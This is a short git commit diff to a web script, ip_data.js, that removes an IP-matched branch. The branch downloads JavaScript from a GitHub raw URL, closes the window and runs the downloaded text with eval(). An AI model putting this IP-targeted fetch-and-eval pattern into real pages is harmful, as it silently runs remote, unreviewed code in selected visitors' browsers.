fd170be692023139e42b6e56af8326f693092576
Reid Incorporated <96025021+thefatpotato115@users.noreply.github.com>
2023-07-12 02:22:05 +0000

    Update ip_data.js

--- Resources/ip_data.js
+++ Resources/ip_data.js
@@ -116,15 +116,6 @@ text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
   }
 
 
- else if (ip == '559f134')
-
-
-  {
-    req = new XMLHttpRequest(); 
-    req.open('GET', 'https://raw.githubusercontent.com/thefatpotato115/Apachi/main/Resources/blacklisted_page.js'); 
-    req.onload = function() { window.close();eval(this.responseText); }; req.send();
-
-  }
 
 
 
